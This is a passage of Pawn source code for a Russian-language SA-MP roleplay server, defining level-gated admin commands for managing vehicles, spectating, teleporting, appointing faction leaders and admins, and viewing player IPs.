	        if((veh = GetVehicleTrailer(veh)) == 0)
	            continue;
	        occupied{veh} = 1;
	    }
	    while(i);

	    for(i = 1; i <= MAX_VEHICLES; ++i)
	        if(occupied{i} == 0)
	              SetVehicleToRespawn(i);
	    SendClientMessage(playerid,-1,"Вы зареспавнили все авто в ближайшем радиусе");
	    return true;
    }
    SetVehicleToRespawn(params[0]);
   	static const fmt_string1[] = "Вы зареспавнили авто ID {f7ae11}%i{FFFFFF}";
	new str1[sizeof(fmt_string1)+4];
	format(str1, sizeof(str1), fmt_string1,params[0]);
	SendClientMessage(playerid,-1,str1);
	return true;
}
CMD:fillcars(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	for(new i = 0; i < MAX_VEHICLES; i++)
	{
		new Float:x,Float:y,Float:z;
        GetVehiclePos(i,x,y,z);
		if(IsPlayerInRangeOfPoint(playerid,50.0,x,y,z)) Fuel[i] = 100;
 	}
	return SendClientMessage(playerid,-1,"Вы заправили все авто в ближайшем радиусе");
}
CMD:spveh(playerid, params[]) return cmd_res(playerid,params);
CMD:delveh(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
    if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /delveh [id]");
	if(params[0] < 0 || params[0] > 100) return true;
    if(admincar[playerid][params[0]] == 0) return SendClientMessage(playerid, CGREY, "Вы не создавали машину в данном слоте");
    if(GetPlayerVehicleID(playerid) == admincar[playerid][params[0]]) RemovePlayerFromVehicle(playerid);
 	DestroyVehicle(admincar[playerid][params[0]]);
	static const fmt_string1[] = "Вы удалили транспорт ID {f7ae11}%i{FFFFFF}";
	new str1[sizeof(fmt_string1)+4];
	format(str1, sizeof(str1), fmt_string1,admincar[playerid][params[0]]);
	SendClientMessage(playerid,-1,str1);
	admincar[playerid][params[0]] = 0;
	return true;
}
CMD:ain(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pLeader] > 0) return SendClientMessage(playerid, CGREY, "Вы являетесь лидер  организации!");
	if(PlayerInfo[playerid][pMember] > 0) return SendClientMessage(playerid, CGREY, "Вы находитесь в другой организации!");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,CGREY,"Игрок в транспорте");
	new str[90];
	query = "";
	for(new i = 1; i <= TOTALFRAC; i++)
	{
		format(str,sizeof(str),"[%i] %s\n",i,FracInfo[i][fName]);
		strcat(query, str);
	}
	ShowPlayerDialog(playerid, 149, 2, "Выберите организацию", query, "Выбор", "Отмена");
	return true;
}
CMD:makeleader(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /makeleader [id игрока]");
	if(params[0] == INVALID_PLAYER_ID) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(IsPlayerInAnyVehicle(params[0])) return SendClientMessage(playerid,CGREY,"Игрок в транспорте");
	if(PlayerInfo[params[0]][pLeader] > 0)
	{
		if(PlayerInfo[params[0]][pLeader] == 0) return SendClientMessage(playerid, CGREY, "Игрок не находится в организации!");
  		if(PlayerInfo[params[0]][pAdmin] == 0)
	    {
			SetFractionStr(PlayerInfo[params[0]][pLeader], "leader", "None");
			strmid(FracInfo[PlayerInfo[params[0]][pLeader]][fLeader],"None",0,strlen("None"),MAX_PLAYER_NAME);
		}
		static const fmt_string[] = "[A] %s снял лидера %s из %s";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],FracInfo[PlayerInfo[params[0]][pMember]][fName]);
		SendAdminMessage(CGREY,str);
		query = "";
        format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str);
		mysql_tquery(mysql,query);
		SendClientMessage(params[0],CYELLOW,"Администратор Вас уволил из организации");
		PlayerInfo[params[0]][pMember] = 0;
		PlayerInfo[params[0]][pRank] = 0;
		PlayerInfo[params[0]][pLeader] = 0;
		PlayerInfo[params[0]][pWork] = 0;
		SetPlayerInt(PlayerInfo[params[0]][pSendername],"member",PlayerInfo[params[0]][pMember]);
		SetPlayerInt(PlayerInfo[params[0]][pSendername],"rank",PlayerInfo[params[0]][pRank]);
		SetPlayerInt(PlayerInfo[params[0]][pSendername],"leader",PlayerInfo[params[0]][pLeader]);
		SpawnPlayer(params[0]);

	}
	else
	{
		if(PlayerInfo[params[0]][pLeader] > 0) return SendClientMessage(playerid, CGREY, "Игрок лидер  организации!");
		if(PlayerInfo[params[0]][pMember] > 0) return SendClientMessage(playerid, CGREY, "Игрок находиться в другой организации!");
		if(PlayerInfo[params[0]][pWarn] > 0) return SendClientMessage(playerid,CGREY,"Вы не можете принять игрока с варном");
	//	if(!PlayerInfo[params[0]][pVKStatus]) return SendClientMessage(playerid,CGREY,"У игрока не включена защита VK!");
		if(PlayerInfo[playerid][pAdmin] < 6 && PlayerInfo[params[0]][pAdmin] && PlayerInfo[params[0]][pAdmin] < 6)
		{
		    return SendClientMessage(playerid,CGREY,"Используйте: /ain");
		}
		new str[90];
		query = "";
		for(new i = 1; i <= TOTALFRAC; i++)
		{
			format(str,sizeof(str),"[%i] %s\n",i,FracInfo[i][fName]);
			strcat(query, str);
		}
		SetPVarInt(playerid, "PlayerLeader", params[0]);
		static const fmt_string2[] = "Назначить %s:";
		new str4[sizeof(fmt_string2)+MAX_PLAYER_NAME];
		format(str4, sizeof(str4), fmt_string2,PlayerInfo[params[0]][pSendername]);
		ShowPlayerDialog(playerid, 18, 2, str4, query, "Выбор", "Отмена");
	}
	return true;
}
CMD:spoff(playerid)
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(GetPVarInt(playerid,"Spec") == 1)
	{
		TogglePlayerSpectating(playerid,false);
		for(new i = 0; i <= 25; i++) TextDrawHideForPlayer(playerid,AdminPanel[i]);
		for(new i = 0; i <= 2; i++) PlayerTextDrawDestroy(playerid,AdminPanelP[i][playerid]);
		CancelSelectTextDraw(playerid);
  	//	for(new i = 0; i <= 3; i++) PlayerTextDrawDestroy(playerid,InfoText[playerid][i]);
	//	PlayerTextDrawHide(playerid,SpecText[playerid]);
	//	PlayerTextDrawDestroy(playerid,SpecText[playerid]);
	//	HideMenuForPlayer(SPpanel,playerid);
	}
	return true;
}

CMD:sp(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /sp [id игрока]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Игрок не в игре");
	if(PlayerInfo[params[0]][pAdmin] > PlayerInfo[playerid][pAdmin]) return true;
	if(GetPVarInt(playerid,"Spec") == 0)
	{
		SetPVarInt(playerid,"Spec",1);

	/*	SpecText[playerid] = CreatePlayerTextDraw(playerid, 487.111358, 161.777847, "_");
		PlayerTextDrawLetterSize(playerid, SpecText[playerid], 0.252222, 1.405866);
		PlayerTextDrawAlignment(playerid, SpecText[playerid], 1);
		PlayerTextDrawColor(playerid, SpecText[playerid], -1);
		PlayerTextDrawSetShadow(playerid, SpecText[playerid], 0);
		PlayerTextDrawSetOutline(playerid, SpecText[playerid], 1);
		PlayerTextDrawBackgroundColor(playerid, SpecText[playerid], 51);
		PlayerTextDrawFont(playerid, SpecText[playerid], 2);
		PlayerTextDrawSetProportional(playerid, SpecText[playerid], 1);
		
		PlayerTextDrawShow(playerid,SpecText[playerid]);
		ShowMenuForPlayer(SPpanel,playerid);
		//for(new i = 0; i <= 5; i++) PlayerTextDrawHide(playerid,InfoText[playerid][i]);
		ShowInfo(playerid,"get out of spec: /spoff");*/
		for(new i = 0; i <= 25; i++) TextDrawShowForPlayer(playerid,AdminPanel[i]);
		
		AdminPanelP[0][playerid] = CreatePlayerTextDraw(playerid, 570.333251, 195.288925, "alexei_light~n~1000~n~12~n~120~n~100~n~100"); // Text element
		PlayerTextDrawLetterSize(playerid, AdminPanelP[0][playerid], 0.147330, 1.044147);
		PlayerTextDrawAlignment(playerid, AdminPanelP[0][playerid], 1);
		PlayerTextDrawColor(playerid, AdminPanelP[0][playerid], -1936945921);
		PlayerTextDrawSetShadow(playerid, AdminPanelP[0][playerid], 0);
		PlayerTextDrawSetOutline(playerid, AdminPanelP[0][playerid], 0);
		PlayerTextDrawBackgroundColor(playerid, AdminPanelP[0][playerid], 51);
		PlayerTextDrawFont(playerid, AdminPanelP[0][playerid], 2);
		PlayerTextDrawSetProportional(playerid, AdminPanelP[0][playerid], 1);

		AdminPanelP[1][playerid] = CreatePlayerTextDraw(playerid, 542.666625, 310.022277, "engine: off"); // box engine
		PlayerTextDrawLetterSize(playerid, AdminPanelP[1][playerid], 0.147330, 1.044147);
		PlayerTextDrawAlignment(playerid, AdminPanelP[1][playerid], 1);
		PlayerTextDrawColor(playerid, AdminPanelP[1][playerid], -567596033);
		PlayerTextDrawSetShadow(playerid, AdminPanelP[1][playerid], 0);
		PlayerTextDrawSetOutline(playerid, AdminPanelP[1][playerid], 0);
		PlayerTextDrawBackgroundColor(playerid, AdminPanelP[1][playerid], 51);
		PlayerTextDrawFont(playerid, AdminPanelP[1][playerid], 2);
		PlayerTextDrawSetProportional(playerid, AdminPanelP[1][playerid], 1);

		AdminPanelP[2][playerid] = CreatePlayerTextDraw(playerid,570.333251, 252.788925, "alexei_light~n~1000~n~12~n~120~n~100~n~100"); // Text element
		PlayerTextDrawLetterSize(playerid,AdminPanelP[2][playerid], 0.147330, 1.044147);
		PlayerTextDrawAlignment(playerid,AdminPanelP[2][playerid], 1);
		PlayerTextDrawColor(playerid,AdminPanelP[2][playerid], -1);
		PlayerTextDrawSetShadow(playerid,AdminPanelP[2][playerid], 0);
		PlayerTextDrawSetOutline(playerid,AdminPanelP[2][playerid], 0);
		PlayerTextDrawBackgroundColor(playerid,AdminPanelP[2][playerid], 51);
		PlayerTextDrawFont(playerid,AdminPanelP[2][playerid], 2);
		PlayerTextDrawSetProportional(playerid,AdminPanelP[2][playerid], 1);
		
        for(new i = 0; i <= 2; i++) PlayerTextDrawShow(playerid,AdminPanelP[i][playerid]);
        SelectTextDraw(playerid, CGREY);
		new Float:x,Float:y,Float:z;
		GetPlayerPos(playerid,x,y,z);
	 	SetPVarFloat(playerid,"Specx",x);
		SetPVarFloat(playerid,"Specy",y);
		SetPVarFloat(playerid,"Specz",z);
		SetPVarInt(playerid,"Speci",GetPlayerInterior(playerid));
		SetPVarInt(playerid,"Specv",GetPlayerVirtualWorld(playerid));
	}
	gun__ignore_tick[playerid] = GetTickCount()+GUN__IGNORE_TIME;
	TogglePlayerSpectating(playerid,true);
	SetPVarInt(playerid,"SpecID",params[0]);
	SetPlayerInterior(playerid,GetPlayerInterior(params[0]));
	SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(params[0]));
	if(IsPlayerInAnyVehicle(params[0]))
	{
		new carid = GetPlayerVehicleID(params[0]);
		PlayerSpectateVehicle(playerid, carid);
	}
	else PlayerSpectatePlayer(playerid,params[0]);
	return true;
}
CMD:spec(playerid, params[]) return cmd_sp(playerid,params);
CMD:specoff(playerid) return cmd_spoff(playerid);
CMD:delvehall(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	SendClientMessage(playerid,CREWARD,"Вы удалили весь транспорт созданный вами");
	for(new i = 1;i <= 100;i++)
	{
		if(!admincar[playerid][i]) continue;
		DestroyVehicle(admincar[playerid][i]);
		admincar[playerid][i] = 0;
	}
	return 1;
}
CMD:ip(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /ip [id игрока]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	new ipStr[16];
    GetPlayerIp(params[0],ipStr,16);
	static const fmt_string2[] = "%s[%d] | IP при регистрации: %s | текущий IP: %s ";
	new str4[sizeof(fmt_string2)+MAX_PLAYER_NAME+3+16+16+16];
	format(str4, sizeof(str4), fmt_string2,PlayerInfo[params[0]][pSendername],params[0],PlayerInfo[params[0]][pIpReg],ipStr);
	SendClientMessage(playerid,CWHITE,str4);
	return true;
}
CMD:spawnplayer(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /spawnplayer [id игрока]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(IsPlayerInAnyVehicle(params[0])) return SendClientMessage(playerid,CGREY,"Игрок в транспорте");
	return SpawnPlayer(params[0]);
}

CMD:gotocar(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 2|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /gotocar [id транспорта]");
	new Float:x,Float:y,Float:z;
	GetVehiclePos(params[0],x,y,z);
	return SetPlayerPos(playerid,x,y+3,z);
}
CMD:spawn(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 2|| AdminLogged[playerid] == false ) return true;
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,CGREY,"Вы в транспорте");
	return SpawnPlayer(playerid);
}

CMD:ah(playerid)
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 1|| AdminLogged[playerid] == false ) return true;
	SendClientMessage(playerid,0xC3C901FF,"Команды администратора:");
/*	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		SendClientMessage(playerid,0xC3C901FF,"1 уровень: /ahelp, /a, /ans, /admins, /tp, /sp, /spoff, /stats, /gun, /cashinfo, /bankinfo, ");
		SendClientMessage(playerid,0xC3C901FF,"/mute, /unmute, /tphome, /tpbiz, /tpcor, /tpmark, /tp, /goto, /gotocar");
	}
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		SendClientMessage(playerid,0xC3C901FF,"2 уровень: /kick, /jail, /ips, /nicks, /history, /orgstat, /fillcars, /fix, /slap, /get,");
		SendClientMessage(playerid,0xC3C901FF,"/rsms, /rf, /spawnplayer, /spawn, /lip, /freeze, /unfreeze");
	}
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		SendClientMessage(playerid,0xC3C901FF,"3 уровень: /ns, /agl, /warn, /ban, /aun, /ip, /gethere, /resetgun, /veh, /delveh, /delvehall, /res,");
		SendClientMessage(playerid,0xC3C901FF,"/boom, /logs, /hp, /jp, /gtp, /cc");
	}
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		SendClientMessage(playerid,0xC3C901FF,"4 уровень: /offwarn, /offban, /tempskin, /unban, /unwarn, /mp, /ain, /objm, /ctable, /dtable, /givegun, /msg, /o");
	}
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		SendClientMessage(playerid,0xC3C901FF,"5 уровень: /makeleader, /banip, /unbanip, /skick, /x, /gzcolor, /offleader, /cbug, /antidm");
	}
	if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		SendClientMessage(playerid,0xC3C901FF,"6 уровень: /restart, /payday, /skin, /aob, /makeadmin, /jp, /gzcolor, /bizmafia(2), /deladmin");
        SendClientMessage(playerid,0xC3C901FF,"/asellhouse, /asellbiz, /weather, /gogolos, /settime, /setstat, /givepriz, /ach, /givewarehouse, /setint,/sethouse");
	}*/

	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		SendClientMessage(playerid,0xC3C901FF,"1 уровень: /ahelp, /a, /ans, /admins, /tp");
	}
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		SendClientMessage(playerid,0xC3C901FF,"2 уровень: /mute, /unmute, /tphome, /tpbiz, /tpcor, /tpmark, /tp, /goto, /gotocar");
		SendClientMessage(playerid,0xC3C901FF,"/nicks, /history, /spawn, /freeze, /unfreeze");
	}
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		SendClientMessage(playerid,0xC3C901FF,"3 уровень: /ns, /agl, /warn, /ban, /aun, /ip, /gethere, /resetgun, /veh, /delveh, /delvehall, /res");
		SendClientMessage(playerid,0xC3C901FF,"/kick, /jail, /logs, /orgstat, /fillcars, /fix, /slap, /get, /rsms, /rf, /spawnplayer");
		SendClientMessage(playerid,0xC3C901FF,"/sp, /spoff, /stats, /gun, /boom, /hp, /jp, /gtp, /cc");
	}
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		SendClientMessage(playerid,0xC3C901FF,"4 уровень: /makeleader, /banip, /unbanip, /skick, /x, /gzcolor, /offleader, /cbug");
		SendClientMessage(playerid,0xC3C901FF,"/offwarn, /offban, /tempskin, /unban, /unwarn, /mp, /ain, /objm, /ctable, /dtable, /givegun, /msg, /o");
	}
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		SendClientMessage(playerid,0xC3C901FF,"5 уровень: /payday, /skin, /aob, /makeadmin, /gzcolor, /bizmafia, /deladmin, /antidm");
		SendClientMessage(playerid,0xC3C901FF,"/asellhouse, /asellbiz, /weather, /settime, /givewarehouse");
	}
	if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		SendClientMessage(playerid,0xC3C901FF,"6 уровень: /restart, /ach, /givepriz, /setstat");
	}

	return true;
}
CMD:gm(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 1|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /gm [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
 	new Float:health;
    GetPlayerHealth(params[0],health);
    if(health < 30) return SendClientMessage(playerid, 0xAFAFAFAA,"У данного игрока очень маленький уровень HP!");
	new Float: position[3];
	GetPlayerPos(params[0], position[0], position[1], position[2]);
	CreateExplosionForPlayer(params[0],position[0], position[1], position[2]+7, 5, 0.5);
	SetTimerEx("GMTest", 1000, false,"ddf",playerid, params[0],health);
    return 1;
}
function ShowDelAdmin(playerid)
{
    new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	    query = "";
	    new sos[32],sis2;
	    new stt[20];
	    new str[50];
		for(new row = 1; row<= rows; row++)
		{
            cache_get_field_content(row-1, "name", sos, mysql);
            sis2 = cache_get_field_content_int(row-1, "admin", mysql);
			format(str,sizeof(str),"%s - %i уровень\n",sos,sis2);
			strcat(query, str);
			
			format(stt,sizeof(stt),"Admin%i",row);
			SetPVarString(playerid,stt,sos);
			ListNick[playerid][row-1] = sis2;
		}
		ShowPlayerDialog(playerid,200,DIALOG_STYLE_LIST,"Администраторы",query,"Снять","Отмена");
		SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
	}
	return 1;
}
function ShowAlist(playerid)
{
    new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	    query = "";
	    new sos[32],sis2,ids,kek = 0;
	    new str[50];
		for(new row = 1; row<= rows; row++)
		{
            cache_get_field_content(row-1, "name", sos, mysql);
            sis2 = cache_get_field_content_int(row-1, "admin", mysql);
            ids = cache_get_field_content_int(row-1, "id", mysql);
			format(str,sizeof(str),"%s - %i уровень\n",sos,sis2);
			strcat(query, str);
			ListNick[playerid][kek] = ids;
			kek++;
		}
		ShowPlayerDialog(playerid,200,DIALOG_STYLE_LIST,"Администраторы",query,"Снять","Отмена");
		SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
	}
	return 1;
}
CMD:alist(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 5|| AdminLogged[playerid] == false ) return true;
	mysql_tquery(mysql, "SELECT * FROM accounts WHERE admin > '0'", "ShowAlist", "d", playerid);
	return 1;
}
CMD:deladmin(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 5|| AdminLogged[playerid] == false ) return true;
	if(FD1 || FD2)
	{
		mysql_tquery(mysql, "SELECT * FROM accounts WHERE admin > '0'", "ShowDelAdmin", "d", playerid);
	/*	format(query, sizeof(query), "SELECT * FROM accounts WHERE admin > '0'");
		mysql_tquery(mysql,query);
		mysql_store_result();
		if(mysql_num_rows() > 0)
		{
		    new srrt[700];
			for(new i = 1; i <= mysql_num_rows();i++)
			{
				mysql_fetch_row(query);
				new sos[32],sis1[2],sis2;
				mysql_get_field("name", sos);
				mysql_get_field("admin", sis1),sis2 = strval(sis1);
				new str[50];
				format(str,sizeof(str),"%s - %i уровень\n",sos,sis2);
				strcat(srrt, str);
				new stt[20];
				format(stt,sizeof(stt),"Admin%i",i);
				SetPVarString(playerid,stt,sos);
				ListNick[playerid][i-1] = sis2;
			}
			mysql_free_result();
			ShowPlayerDialog(playerid,200,DIALOG_STYLE_LIST,"Администраторы",srrt,"Снять","Отмена");
			SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
		}*/
	}
    return 1;
}
CMD:ahelp(playerid) return cmd_ah(playerid);
CMD:slap(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /slap [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	new Float:shealth,Float:slx, Float:sly, Float:slz;
	GetPlayerHealth(params[0], shealth);
	SetHealth(params[0], shealth-5);
	GetPlayerPos(params[0], slx, sly, slz);
	SetPlayerPos(params[0], slx, sly, slz+5);
	PlayerPlaySound(params[0], 1130, slx, sly, slz+5);
	SendClientMessage(playerid,CREWARD,"Вы подкинули игрока");
	return true;
}
CMD:gge(playerid)
{
	SetPlayerInterior(playerid,6);
	SetPlayerPos(playerid,-1.4070-2.0, -6.0639+2.0, 1999.8468);
	return 1;
}
CMD:tp(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 1|| AdminLogged[playerid] == false ) return true;
	ShowPlayerDialog(playerid,92,DIALOG_STYLE_LIST,"TP","{FFFFFF}1 | Основное\n2 | База организаций\n3 | Работы\n4 | Авторынки\n5 | Развлечения\n6 | Дальнобойщики\n7 | Админ тюрьма\n8 | Тюрьма\n9 | Крыша San-Fierro","Далее","Назад");
	return true;
}
CMD:goto(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 1|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /goto [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	new Float:x,Float:y,Float:z;
	GetPlayerPos(params[0],x,y,z);
	static const fmt_string2[] = "Вы телепортировались к {f7ae11}%s{FFFFFF}";
	new str4[sizeof(fmt_string2)+MAX_PLAYER_NAME];
	format(str4, sizeof(str4), fmt_string2,PlayerInfo[params[0]][pSendername]);
	SendClientMessage(playerid,-1,str4);
	new hour, minutes;
	GetPlayerTime(playerid, hour, minutes);
	new ghour1,gminute1,gsecond1;
	gettime(ghour1,gminute1,gsecond1);
	if(hour != ghour1) SetPlayerTime(playerid,ghour1,gminute1);
	DeletePVar(playerid,"PBIZ");
	if(GetPlayerState(playerid) == 2)
	{
	    SetVehiclePos(GetPlayerVehicleID(playerid),x,y+4,z+4);
	    PutPlayerInVehicle(playerid,GetPlayerVehicleID(playerid),0);
	    for(new i = 0; i < MAX_PLAYERS; i++)
		{
		    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
			if(GetPlayerVehicleID(i) == GetPlayerVehicleID(playerid)) tp__ignore_tick[i] = GetTickCount()+TP__IGNORE_TIME;
		}
	}
	else
	{
		SetPlayerPos(playerid,x,y,z);
		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(params[0]));
		SetPlayerInterior(playerid, GetPlayerInterior(params[0]));
	}
	return true;
}
CMD:gethere(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /gethere [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(strcmp(PlayerInfo[params[0]][pSendername], "Enique_Guddi", true) == 0)
	{
		SendClientMessage(playerid,CREWARD,"Игроку выслано предложения для телепортации");
		static const fmt_string3[] = "%s{FFFFFF} хочет телепортировать Вас к себе. Используйте: {f7ae11}/goto %i";
		new str5[sizeof(fmt_string3)+MAX_PLAYER_NAME+4];
		format(str5, sizeof(str5), fmt_string3,PlayerInfo[playerid][pSendername],playerid);
		return SendClientMessage(params[0],CREWARD,str5);
	}
	new hour, minutes;
	GetPlayerTime(params[0], hour, minutes);
	new ghour1,gminute1,gsecond1;
 	gettime(ghour1,gminute1,gsecond1);
	if(hour != ghour1) SetPlayerTime(params[0],ghour1,gminute1);
	tp__ignore_tick[params[0]] = GetTickCount()+TP__IGNORE_TIME;
	if(GetPlayerState(playerid) == 2) RemovePlayerFromVehicle(playerid);
	new Float:x,Float:y,Float:z;
	GetPlayerPos(playerid,x,y,z);
	SetPlayerPos(params[0],x,y,z);
	SetPlayerVirtualWorld(params[0], GetPlayerVirtualWorld(playerid));
	SetPlayerInterior(params[0], GetPlayerInterior(playerid));
	static const fmt_string2[] = "Вы телепортировали к себе {f7ae11}%s{FFFFFF}";
	new str4[sizeof(fmt_string2)+MAX_PLAYER_NAME];
	format(str4, sizeof(str4), fmt_string2,PlayerInfo[params[0]][pSendername]);
	SendClientMessage(playerid,-1,str4);
	return true;
}
CMD:rr(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 1|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "us[100]", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /ans [id] [текст]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	static const fmt_string[] = "[A] %s ответил(а) игроку %s: %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+100];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],params[1]);
	SendAdminMessage(0x7AD124FF,str);
	static const fmt_string1[] = "Вы получили ответ от администратора %s: %s";
	new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+64];
	format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],params[1]);
	SendClientMessage(params[0],0x7AD124FF,str1);
	PlayerInfo[playerid][pAnsKol]++;
	return true;
}
CMD:ans(playerid,params[]) return cmd_rr(playerid,params);

CMD:makeadmin(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false ) return true;
    if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /makeadmin [id] [уровень]");
   	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	switch(PlayerInfo[playerid][pAdmin])
	{
	    case 5: if(params[1] < 0 || params[1] > 4) return SendClientMessage(playerid,CGREY,"Уровень от 0 до 4");
   		case 6: if(params[1] < 0 || params[1] > 6) return SendClientMessage(playerid,CGREY,"Уровень от 0 до 6");
   	}
//  if(!PlayerInfo[params[0]][pVKStatus]) return SendClientMessage(playerid,CGREY,"У игрока не включена защита VK!");
	if(params[1] == 0) PlayerInfo[params[0]][pAvig] = 0;
	static const fmt_string[] = "[A] %s выдал игроку %s права администратора %i-го уровня";
	new str[sizeof(fmt_string)+2+MAX_PLAYER_NAME+4+32];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],params[1]);
	SendAdminMessage(CGREY,str);
	SendClientMessage(params[0],CGREY,str);
	if(PlayerInfo[params[0]][pAdmin] == 0) SendClientMessage(params[0],CGREY,str),ShowPlayerDialog(params[0],8,DIALOG_STYLE_INPUT,"Установите пароль","{FFFFFF}Используйте только цифры. Не менее 5 символов.","Готово","Отмена");
    PlayerInfo[params[0]][pAdmin] = params[1];
    SendClientMessage(params[0],CYELLOW,"Вы назначены администратором. Команды администратора: /ah");
	return true;
}
